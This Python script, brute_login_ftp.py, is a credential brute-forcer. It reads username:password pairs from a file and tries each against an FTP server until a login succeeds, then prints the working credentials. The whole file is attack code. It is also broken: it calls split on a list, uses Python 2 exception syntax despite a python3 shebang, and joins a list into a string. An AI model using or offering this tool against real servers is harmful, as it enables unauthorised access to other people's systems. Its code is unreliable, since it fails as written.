#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019-05-10 1:07
# @Author  : Zhang Bin
# @Site    : 
# @File    : brute_login_ftp.py
# @Software: PyCharm
# 暴力登录ftp

import ftplib
def brute_login(hostname, password_file):
    with open(password_file, 'r') as f:
        for line in f.readlines():
            user_name = line.split(':')[0]
            password = line.split(':')[1].split('\r').split('\n')
            print('[+] Trying: ' + user_name + '/' + password)
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(user_name, password)
                print('\n[*] ' + str(hostname) + ' Ftp Login successed: '
                      + user_name + '/' + password)
                ftp.quit()
                return (user_name, password)
            except Exception, e:
                pass
    print('\n[-] Could not brute force ftp credentials')
    return (None, None)
host = ''
password_file = ''
brute_login(host, password_file)
